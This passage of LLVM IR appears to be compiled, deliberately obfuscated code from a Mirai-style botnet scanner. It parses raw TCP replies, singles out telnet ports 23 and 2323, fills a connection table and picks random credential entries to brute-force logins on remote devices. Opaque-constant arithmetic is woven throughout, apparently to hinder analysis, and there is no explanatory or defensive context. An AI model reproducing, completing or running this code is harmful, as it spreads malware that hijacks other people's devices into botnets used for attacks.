; <label>:280:                                    ; preds = %446, %416, %401, %386, %371, %360, %349, %340, %323, %316, %309, %279
  %281 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %282 = bitcast i8* %281 to %struct.iphdr*
  store %struct.iphdr* %282, %struct.iphdr** %20, align 8
  %283 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i64 1
  %285 = bitcast %struct.iphdr* %284 to %struct.tcphdr*
  store %struct.tcphdr* %285, %struct.tcphdr** %21, align 8
  %286 = call i32* @__errno_location() #7
  store i32 0, i32* %286, align 4
  %287 = load i32, i32* @rsck, align 4
  %288 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %289 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %289, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @recvfrom(i32 %287, i8* %288, i64 1514, i32 16384, %struct.sockaddr* %291, i32* null)
  %293 = trunc i64 %292 to i32
  store i32 %293, i32* %18, align 4
  %294 = load i32, i32* %18, align 4
  %295 = icmp sle i32 %294, 0
  br i1 %295, label %304, label %296

; <label>:296:                                    ; preds = %280
  %297 = call i32* @__errno_location() #7
  %298 = load i32, i32* %297, align 4
  %299 = icmp eq i32 %298, 11
  br i1 %299, label %304, label %300

; <label>:300:                                    ; preds = %296
  %301 = call i32* @__errno_location() #7
  %302 = load i32, i32* %301, align 4
  %303 = icmp eq i32 %302, 11
  br i1 %303, label %304, label %305

; <label>:304:                                    ; preds = %300, %296, %280
  br label %458

; <label>:305:                                    ; preds = %300
  %306 = load i32, i32* %18, align 4
  %307 = sext i32 %306 to i64
  %308 = icmp ult i64 %307, 40
  br i1 %308, label %309, label %310

; <label>:309:                                    ; preds = %305
  br label %280

; <label>:310:                                    ; preds = %305
  %311 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 9
  %313 = load i32, i32* %312, align 4
  %314 = load i32, i32* @LOCAL_ADDR, align 4
  %315 = icmp ne i32 %313, %314
  br i1 %315, label %316, label %317

; <label>:316:                                    ; preds = %310
  br label %280

; <label>:317:                                    ; preds = %310
  %318 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 6
  %320 = load i8, i8* %319, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp ne i32 %321, 6
  br i1 %322, label %323, label %324

; <label>:323:                                    ; preds = %317
  br label %280

; <label>:324:                                    ; preds = %317
  %325 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = load i16, i16* %326, align 4
  %328 = zext i16 %327 to i32
  %329 = call zeroext i16 @htons(i16 zeroext 23) #7
  %330 = zext i16 %329 to i32
  %331 = icmp ne i32 %328, %330
  br i1 %331, label %332, label %341

; <label>:332:                                    ; preds = %324
  %333 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 0
  %335 = load i16, i16* %334, align 4
  %336 = zext i16 %335 to i32
  %337 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %338 = zext i16 %337 to i32
  %339 = icmp ne i32 %336, %338
  br i1 %339, label %340, label %341

; <label>:340:                                    ; preds = %332
  br label %280

; <label>:341:                                    ; preds = %332, %324
  %342 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %343 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %342, i32 0, i32 1
  %344 = load i16, i16* %343, align 2
  %345 = zext i16 %344 to i32
  %346 = load i16, i16* %2, align 2
  %347 = zext i16 %346 to i32
  %348 = icmp ne i32 %345, %347
  br i1 %348, label %349, label %350

; <label>:349:                                    ; preds = %341
  br label %280

; <label>:350:                                    ; preds = %341
  %351 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %352 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %351, i32 0, i32 4
  %353 = load i16, i16* %352, align 4
  %354 = lshr i16 %353, 9
  %355 = xor i16 1, -1
  %356 = xor i16 %354, %355
  %357 = and i16 %356, %354
  %358 = and i16 %354, 1
  %359 = icmp ne i16 %357, 0
  br i1 %359, label %361, label %360

; <label>:360:                                    ; preds = %350
  br label %280

; <label>:361:                                    ; preds = %350
  %362 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %363 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %362, i32 0, i32 4
  %364 = load i16, i16* %363, align 4
  %365 = lshr i16 %364, 12
  %366 = xor i16 1, -1
  %367 = xor i16 %365, %366
  %368 = and i16 %367, %365
  %369 = and i16 %365, 1
  %370 = icmp ne i16 %368, 0
  br i1 %370, label %372, label %371

; <label>:371:                                    ; preds = %361
  br label %280

; <label>:372:                                    ; preds = %361
  %373 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %374 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %373, i32 0, i32 4
  %375 = load i16, i16* %374, align 4
  %376 = lshr i16 %375, 10
  %377 = xor i16 %376, -1
  %378 = xor i16 1, -1
  %379 = xor i16 -32313, -1
  %380 = or i16 %377, %378
  %381 = or i16 -32313, %379
  %382 = xor i16 %380, -1
  %383 = and i16 %382, %381
  %384 = and i16 %376, 1
  %385 = icmp ne i16 %383, 0
  br i1 %385, label %386, label %387

; <label>:386:                                    ; preds = %372
  br label %280

; <label>:387:                                    ; preds = %372
  %388 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 4
  %390 = load i16, i16* %389, align 4
  %391 = lshr i16 %390, 8
  %392 = xor i16 %391, -1
  %393 = xor i16 1, -1
  %394 = xor i16 21462, -1
  %395 = or i16 %392, %393
  %396 = or i16 21462, %394
  %397 = xor i16 %395, -1
  %398 = and i16 %397, %396
  %399 = and i16 %391, 1
  %400 = icmp ne i16 %398, 0
  br i1 %400, label %401, label %402

; <label>:401:                                    ; preds = %387
  br label %280

; <label>:402:                                    ; preds = %387
  %403 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 3
  %405 = load i32, i32* %404, align 4
  %406 = call i32 @ntohl(i32 %405) #7
  %407 = add i32 %406, 966519017
  %408 = sub i32 %407, 1
  %409 = sub i32 %408, 966519017
  %410 = sub i32 %406, 1
  %411 = call i32 @htonl(i32 %409) #7
  %412 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 8
  %414 = load i32, i32* %413, align 4
  %415 = icmp ne i32 %411, %414
  br i1 %415, label %416, label %417

; <label>:416:                                    ; preds = %402
  br label %280

; <label>:417:                                    ; preds = %402
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %418 = load i32, i32* %9, align 4
  store i32 %418, i32* %18, align 4
  br label %419

; <label>:419:                                    ; preds = %437, %417
  %420 = load i32, i32* %18, align 4
  %421 = icmp slt i32 %420, 256
  br i1 %421, label %422, label %442

; <label>:422:                                    ; preds = %419
  %423 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %424 = load i32, i32* %18, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %423, i64 %425
  %427 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %426, i32 0, i32 3
  %428 = load i32, i32* %427, align 8
  %429 = icmp eq i32 %428, 0
  br i1 %429, label %430, label %436

; <label>:430:                                    ; preds = %422
  %431 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %432 = load i32, i32* %18, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %431, i64 %433
  store %struct.scanner_connection* %434, %struct.scanner_connection** %22, align 8
  %435 = load i32, i32* %18, align 4
  store i32 %435, i32* %9, align 4
  br label %442

; <label>:436:                                    ; preds = %422
  br label %437

; <label>:437:                                    ; preds = %436
  %438 = load i32, i32* %18, align 4
  %439 = sub i32 0, 1
  %440 = sub i32 %438, %439
  %441 = add nsw i32 %438, 1
  store i32 %440, i32* %18, align 4
  br label %419

; <label>:442:                                    ; preds = %430, %419
  %443 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %444 = icmp eq %struct.scanner_connection* %443, null
  br i1 %444, label %445, label %446

; <label>:445:                                    ; preds = %442
  br label %458

; <label>:446:                                    ; preds = %442
  %447 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 8
  %449 = load i32, i32* %448, align 4
  %450 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %451 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %450, i32 0, i32 4
  store i32 %449, i32* %451, align 4
  %452 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %453 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %452, i32 0, i32 0
  %454 = load i16, i16* %453, align 4
  %455 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %456 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %455, i32 0, i32 5
  store i16 %454, i16* %456, align 8
  %457 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %457)
  br label %280

; <label>:458:                                    ; preds = %445, %304
  br label %459

; <label>:459:                                    ; preds = %458
  %460 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %461 = getelementptr inbounds [16 x i64], [16 x i64]* %460, i64 0, i64 0
  %462 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %461) #6, !srcloc !1
  %463 = extractvalue { i64, i64* } %462, 0
  %464 = extractvalue { i64, i64* } %462, 1
  %465 = trunc i64 %463 to i32
  store i32 %465, i32* %24, align 4
  %466 = ptrtoint i64* %464 to i64
  %467 = trunc i64 %466 to i32
  store i32 %467, i32* %25, align 4
  br label %468

; <label>:468:                                    ; preds = %459
  br label %469

; <label>:469:                                    ; preds = %468
  %470 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %471 = getelementptr inbounds [16 x i64], [16 x i64]* %470, i64 0, i64 0
  %472 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %471) #6, !srcloc !2
  %473 = extractvalue { i64, i64* } %472, 0
  %474 = extractvalue { i64, i64* } %472, 1
  %475 = trunc i64 %473 to i32
  store i32 %475, i32* %26, align 4
  %476 = ptrtoint i64* %474 to i64
  %477 = trunc i64 %476 to i32
  store i32 %477, i32* %27, align 4
  br label %478

; <label>:478:                                    ; preds = %469
  store i32 0, i32* %1, align 4
  br label %479

; <label>:479:                                    ; preds = %637, %478
  %480 = load i32, i32* %1, align 4
  %481 = icmp slt i32 %480, 256
  br i1 %481, label %482, label %644

; <label>:482:                                    ; preds = %479
  %483 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %484 = load i32, i32* %1, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %483, i64 %485
  store %struct.scanner_connection* %486, %struct.scanner_connection** %7, align 8
  %487 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %488 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %487, i32 0, i32 3
  %489 = load i32, i32* %488, align 8
  %490 = icmp ugt i32 %489, 1
  %491 = select i1 %490, i32 30, i32 5
  store i32 %491, i32* %28, align 4
  %492 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %493 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %492, i32 0, i32 3
  %494 = load i32, i32* %493, align 8
  %495 = icmp ne i32 %494, 0
  br i1 %495, label %496, label %543

; <label>:496:                                    ; preds = %482
  %497 = load i32, i32* @fake_time, align 4
  %498 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %499 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %498, i32 0, i32 2
  %500 = load i32, i32* %499, align 4
  %501 = sub i32 %497, -432508092
  %502 = sub i32 %501, %500
  %503 = add i32 %502, -432508092
  %504 = sub i32 %497, %500
  %505 = load i32, i32* %28, align 4
  %506 = icmp ugt i32 %503, %505
  br i1 %506, label %507, label %543

; <label>:507:                                    ; preds = %496
  %508 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %509 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %508, i32 0, i32 1
  %510 = load i32, i32* %509, align 8
  %511 = call i32 @close(i32 %510)
  %512 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %513 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %512, i32 0, i32 1
  store i32 -1, i32* %513, align 8
  %514 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %515 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %514, i32 0, i32 3
  %516 = load i32, i32* %515, align 8
  %517 = icmp ugt i32 %516, 2
  br i1 %517, label %518, label %537

; <label>:518:                                    ; preds = %507
  %519 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %520 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %519, i32 0, i32 8
  %521 = load i8, i8* %520, align 8
  %522 = sub i8 0, %521
  %523 = sub i8 0, 1
  %524 = add i8 %522, %523
  %525 = sub i8 0, %524
  %526 = add i8 %521, 1
  store i8 %525, i8* %520, align 8
  %527 = zext i8 %525 to i32
  %528 = icmp eq i32 %527, 10
  br i1 %528, label %529, label %534

; <label>:529:                                    ; preds = %518
  %530 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %531 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %530, i32 0, i32 8
  store i8 0, i8* %531, align 8
  %532 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %533 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %532, i32 0, i32 3
  store i32 0, i32* %533, align 8
  br label %536

; <label>:534:                                    ; preds = %518
  %535 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %535)
  br label %536

; <label>:536:                                    ; preds = %534, %529
  br label %542

; <label>:537:                                    ; preds = %507
  %538 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %539 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %538, i32 0, i32 8
  store i8 0, i8* %539, align 8
  %540 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %541 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %540, i32 0, i32 3
  store i32 0, i32* %541, align 8
  br label %542

; <label>:542:                                    ; preds = %537, %536
  br label %637

; <label>:543:                                    ; preds = %496, %482
  %544 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %545 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %544, i32 0, i32 3
  %546 = load i32, i32* %545, align 8
  %547 = icmp eq i32 %546, 1
  br i1 %547, label %548, label %589

; <label>:548:                                    ; preds = %543
  %549 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %550 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %549, i32 0, i32 1
  %551 = load i32, i32* %550, align 8
  %552 = srem i32 %551, 64
  %553 = zext i32 %552 to i64
  %554 = shl i64 1, %553
  %555 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %556 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %557 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %556, i32 0, i32 1
  %558 = load i32, i32* %557, align 8
  %559 = sdiv i32 %558, 64
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds [16 x i64], [16 x i64]* %555, i64 0, i64 %560
  %562 = load i64, i64* %561, align 8
  %563 = xor i64 %562, -1
  %564 = xor i64 %554, -1
  %565 = xor i64 6362106125836974102, -1
  %566 = and i64 %563, 6362106125836974102
  %567 = and i64 %562, %565
  %568 = and i64 %564, 6362106125836974102
  %569 = and i64 %554, %565
  %570 = or i64 %566, %567
  %571 = or i64 %568, %569
  %572 = xor i64 %570, %571
  %573 = or i64 %563, %564
  %574 = xor i64 %573, -1
  %575 = or i64 6362106125836974102, %565
  %576 = and i64 %574, %575
  %577 = or i64 %572, %576
  %578 = or i64 %562, %554
  store i64 %577, i64* %561, align 8
  %579 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %580 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %579, i32 0, i32 1
  %581 = load i32, i32* %580, align 8
  %582 = load i32, i32* %12, align 4
  %583 = icmp sgt i32 %581, %582
  br i1 %583, label %584, label %588

; <label>:584:                                    ; preds = %548
  %585 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %586 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %585, i32 0, i32 1
  %587 = load i32, i32* %586, align 8
  store i32 %587, i32* %12, align 4
  br label %588

; <label>:588:                                    ; preds = %584, %548
  br label %636

; <label>:589:                                    ; preds = %543
  %590 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %591 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %590, i32 0, i32 3
  %592 = load i32, i32* %591, align 8
  %593 = icmp ne i32 %592, 0
  br i1 %593, label %594, label %635

; <label>:594:                                    ; preds = %589
  %595 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %596 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %595, i32 0, i32 1
  %597 = load i32, i32* %596, align 8
  %598 = srem i32 %597, 64
  %599 = zext i32 %598 to i64
  %600 = shl i64 1, %599
  %601 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %602 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %603 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %602, i32 0, i32 1
  %604 = load i32, i32* %603, align 8
  %605 = sdiv i32 %604, 64
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [16 x i64], [16 x i64]* %601, i64 0, i64 %606
  %608 = load i64, i64* %607, align 8
  %609 = xor i64 %608, -1
  %610 = xor i64 %600, -1
  %611 = xor i64 2995496195552409106, -1
  %612 = and i64 %609, 2995496195552409106
  %613 = and i64 %608, %611
  %614 = and i64 %610, 2995496195552409106
  %615 = and i64 %600, %611
  %616 = or i64 %612, %613
  %617 = or i64 %614, %615
  %618 = xor i64 %616, %617
  %619 = or i64 %609, %610
  %620 = xor i64 %619, -1
  %621 = or i64 2995496195552409106, %611
  %622 = and i64 %620, %621
  %623 = or i64 %618, %622
  %624 = or i64 %608, %600
  store i64 %623, i64* %607, align 8
  %625 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %626 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %625, i32 0, i32 1
  %627 = load i32, i32* %626, align 8
  %628 = load i32, i32* %11, align 4
  %629 = icmp sgt i32 %627, %628
  br i1 %629, label %630, label %634

; <label>:630:                                    ; preds = %594
  %631 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %632 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %631, i32 0, i32 1
  %633 = load i32, i32* %632, align 8
  store i32 %633, i32* %11, align 4
  br label %634

; <label>:634:                                    ; preds = %630, %594
  br label %635

; <label>:635:                                    ; preds = %634, %589
  br label %636

; <label>:636:                                    ; preds = %635, %588
  br label %637

; <label>:637:                                    ; preds = %636, %542
  %638 = load i32, i32* %1, align 4
  %639 = sub i32 0, %638
  %640 = sub i32 0, 1
  %641 = add i32 %639, %640
  %642 = sub i32 0, %641
  %643 = add nsw i32 %638, 1
  store i32 %642, i32* %1, align 4
  br label %479

; <label>:644:                                    ; preds = %479
  %645 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 1
  store i64 0, i64* %645, align 8
  %646 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 0
  store i64 1, i64* %646, align 8
  %647 = load i32, i32* %12, align 4
  %648 = load i32, i32* %11, align 4
  %649 = icmp sgt i32 %647, %648
  br i1 %649, label %650, label %652

; <label>:650:                                    ; preds = %644
  %651 = load i32, i32* %12, align 4
  br label %654

; <label>:652:                                    ; preds = %644
  %653 = load i32, i32* %11, align 4
  br label %654

; <label>:654:                                    ; preds = %652, %650
  %655 = phi i32 [ %651, %650 ], [ %653, %652 ]
  %656 = add i32 1, 1117947468
  %657 = add i32 %656, %655
  %658 = sub i32 %657, 1117947468
  %659 = add nsw i32 1, %655
  %660 = call i32 @select(i32 %658, %struct.fd_set.26* %5, %struct.fd_set.26* %6, %struct.fd_set.26* null, %struct.timeval.27* %8)
  store i32 %660, i32* %13, align 4
  %661 = call i64 @time(i64* null) #6
  %662 = trunc i64 %661 to i32
  store i32 %662, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %663

; <label>:663:                                    ; preds = %1112, %654
  %664 = load i32, i32* %1, align 4
  %665 = icmp slt i32 %664, 256
  br i1 %665, label %666, label %1118

; <label>:666:                                    ; preds = %663
  %667 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %668 = load i32, i32* %1, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %667, i64 %669
  store %struct.scanner_connection* %670, %struct.scanner_connection** %7, align 8
  %671 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %672 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %671, i32 0, i32 1
  %673 = load i32, i32* %672, align 8
  %674 = icmp eq i32 %673, -1
  br i1 %674, label %675, label %676

; <label>:675:                                    ; preds = %666
  br label %1112

; <label>:676:                                    ; preds = %666
  %677 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %678 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %679 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %678, i32 0, i32 1
  %680 = load i32, i32* %679, align 8
  %681 = sdiv i32 %680, 64
  %682 = sext i32 %681 to i64
  %683 = getelementptr inbounds [16 x i64], [16 x i64]* %677, i64 0, i64 %682
  %684 = load i64, i64* %683, align 8
  %685 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %686 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %685, i32 0, i32 1
  %687 = load i32, i32* %686, align 8
  %688 = srem i32 %687, 64
  %689 = zext i32 %688 to i64
  %690 = shl i64 1, %689
  %691 = xor i64 %684, -1
  %692 = xor i64 %690, -1
  %693 = xor i64 8997836863789413257, -1
  %694 = or i64 %691, %692
  %695 = or i64 8997836863789413257, %693
  %696 = xor i64 %694, -1
  %697 = and i64 %696, %695
  %698 = and i64 %684, %690
  %699 = icmp ne i64 %697, 0
  br i1 %699, label %700, label %731

; <label>:700:                                    ; preds = %676
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %701 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %702 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %701, i32 0, i32 1
  %703 = load i32, i32* %702, align 8
  %704 = bitcast i32* %29 to i8*
  %705 = call i32 @getsockopt(i32 %703, i32 1, i32 4, i8* %704, i32* %31) #6
  store i32 %705, i32* %30, align 4
  %706 = load i32, i32* %29, align 4
  %707 = icmp eq i32 %706, 0
  br i1 %707, label %708, label %719

; <label>:708:                                    ; preds = %700
  %709 = load i32, i32* %30, align 4
  %710 = icmp eq i32 %709, 0
  br i1 %710, label %711, label %719

; <label>:711:                                    ; preds = %708
  %712 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %713 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %712, i32 0, i32 3
  store i32 2, i32* %713, align 8
  %714 = call %struct.scanner_auth* @random_auth_entry()
  %715 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %716 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %715, i32 0, i32 0
  store %struct.scanner_auth* %714, %struct.scanner_auth** %716, align 8
  %717 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %718 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %717, i32 0, i32 6
  store i32 0, i32* %718, align 4
  br label %730

; <label>:719:                                    ; preds = %708, %700
  %720 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %721 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %720, i32 0, i32 1
  %722 = load i32, i32* %721, align 8
  %723 = call i32 @close(i32 %722)
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %725 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %724, i32 0, i32 1
  store i32 -1, i32* %725, align 8
  %726 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %727 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %726, i32 0, i32 8
  store i8 0, i8* %727, align 8
  %728 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %729 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %728, i32 0, i32 3
  store i32 0, i32* %729, align 8
  br label %1112

; <label>:730:                                    ; preds = %711
  br label %731

; <label>:731:                                    ; preds = %730, %676
  %732 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %733 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %734 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %733, i32 0, i32 1
  %735 = load i32, i32* %734, align 8
  %736 = sdiv i32 %735, 64
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds [16 x i64], [16 x i64]* %732, i64 0, i64 %737
  %739 = load i64, i64* %738, align 8
  %740 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %741 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %740, i32 0, i32 1
  %742 = load i32, i32* %741, align 8
  %743 = srem i32 %742, 64
  %744 = zext i32 %743 to i64
  %745 = shl i64 1, %744
  %746 = xor i64 %739, -1
  %747 = xor i64 %745, -1
  %748 = xor i64 -4252740040409400657, -1
  %749 = or i64 %746, %747
  %750 = or i64 -4252740040409400657, %748
  %751 = xor i64 %749, -1
  %752 = and i64 %751, %750
  %753 = and i64 %739, %745
  %754 = icmp ne i64 %752, 0
  br i1 %754, label %755, label %1111

; <label>:755:                                    ; preds = %731
  br label %756

; <label>:756:                                    ; preds = %1109, %755
  %757 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %758 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %757, i32 0, i32 3
  %759 = load i32, i32* %758, align 8
  %760 = icmp eq i32 %759, 0
  br i1 %760, label %761, label %762

; <label>:761:                                    ; preds = %756
  br label %1110

; <label>:762:                                    ; preds = %756
  %763 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %764 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %763, i32 0, i32 6
  %765 = load i32, i32* %764, align 4
  %766 = icmp eq i32 %765, 256
  br i1 %766, label %767, label %782

; <label>:767:                                    ; preds = %762
  %768 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %769 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %768, i32 0, i32 7
  %770 = getelementptr inbounds [256 x i8], [256 x i8]* %769, i32 0, i32 0
  %771 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %772 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %771, i32 0, i32 7
  %773 = getelementptr inbounds [256 x i8], [256 x i8]* %772, i32 0, i32 0
  %774 = getelementptr inbounds i8, i8* %773, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %770, i8* %774, i64 192, i32 1, i1 false)
  %775 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %776 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %775, i32 0, i32 6
  %777 = load i32, i32* %776, align 4
  %778 = sub i32 %777, -1064648681
  %779 = sub i32 %778, 64
  %780 = add i32 %779, -1064648681
  %781 = sub nsw i32 %777, 64
  store i32 %780, i32* %776, align 4
  br label %782

; <label>:782:                                    ; preds = %767, %762
  %783 = call i32* @__errno_location() #7
  store i32 0, i32* %783, align 4
  %784 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %785 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %784, i32 0, i32 1
  %786 = load i32, i32* %785, align 8
